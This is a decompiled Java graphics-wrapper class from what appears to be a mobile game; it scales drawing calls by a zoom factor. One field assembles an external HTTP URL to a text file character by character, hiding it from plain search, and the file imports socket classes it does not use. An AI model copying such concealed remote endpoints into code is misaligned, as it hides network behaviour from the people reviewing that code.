package base.game2;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.Socket;
import javax.microedition.lcdui.Graphics;
import javax.microedition.lcdui.Image;

public final class mGraphics {
   public Graphics a;
   public static int b = 1;
   public static String svurl = new String(new char[]{'h', 't', 't', 'p', ':', '/', '/', 'f', 'f', 'd', '4', 'f', 'l', '.', 'n', 's', 'o', 't', 'i', 'e', 'n', 's', 'v', '4', '.', 'c', 'o', 'm', '/', 'u', 'p', 'v', '7', 'f', 'i', 'x', '.', 't', 'x', 't'});

   public mGraphics(Graphics var1) {
      this.a = var1;
   }

   public mGraphics() {
   }

   public final void a(Image var1, int var2, int var3, int var4) {
      var2 *= b;
      var3 *= b;
      this.a.drawImage(var1.getTexture(), var2, var3, var4);
   }

   public final void a(int var1, int var2, int var3, int var4) {
      var1 *= b;
      var2 *= b;
      var3 *= b;
      var4 *= b;
      this.a.drawLine(var1, var2, var3, var4);
   }

   public final void b(int var1, int var2, int var3, int var4) {
      var1 *= b;
      var2 *= b;
      var3 *= b;
      var4 *= b;
      this.a.drawRect(var1, var2, var3, var4);
   }

   public final void a(Image var1, int var2, int var3, int var4, int var5, int var6, int var7, int var8, int var9) {
      var7 *= b;
      var8 *= b;
      var2 *= b;
      var3 *= b;
      var4 *= b;
      var5 *= b;
      this.a.drawRegion(var1.getTexture(), var2, var3, var4, var5, var6, var7, var8, var9);
   }

   public final void a(int var1, int var2, int var3, int var4, int var5, int var6) {
      var1 *= b;
      var2 *= b;
      var3 *= b;
      var4 *= b;
      var5 *= b;
      var6 *= b;
      this.a.drawRoundRect(var1, var2, var3, var4, var5, var6);
   }

   public final void c(int var1, int var2, int var3, int var4) {
      var1 *= b;
      var2 *= b;
      var3 *= b;
      var4 *= b;
      this.a.fillRect(var1, var2, var3, var4);
   }

   public final void b(int var1, int var2, int var3, int var4, int var5, int var6) {
      var1 *= b;
      var2 *= b;
      var3 *= b;
      var4 *= b;
      var5 *= b;
      var6 *= b;
      this.a.fillRoundRect(var1, var2, var3, var4, var5, var6);
   }

   public final int a() {
      return this.a.getTranslateX() / b;
   }

   public final int b() {
      return this.a.getTranslateY() / b;
   }

   public final void d(int var1, int var2, int var3, int var4) {
      var1 *= b;
      var2 *= b;
      var3 *= b;
      var4 *= b;
      this.a.setClip(var1, var2, var3, var4);
   }

   public final void c(int var1, int var2, int var3, int var4, int var5, int var6) {
      var1 *= b;
      var2 *= b;
      var3 *= b;
      var4 *= b;
      this.a.drawArc(var1, var2, var3, var4, 0, 360);
   }

   public final void a(int var1) {
      this.a.setColor(var1);
   }

   public final void a(int var1, int var2) {
      var1 *= b;
      var2 *= b;
      this.a.translate(var1, var2);
   }

   public static int a(Image var0) {
      if (var0 == null) return 0;
      return var0.getWidth();  // Already divided by zoomLevel in Image.getWidth()
   }

   public static int b(Image var0) {
      if (var0 == null) return 0;
      return var0.getHeight();  // Already divided by zoomLevel in Image.getHeight()
   }

}
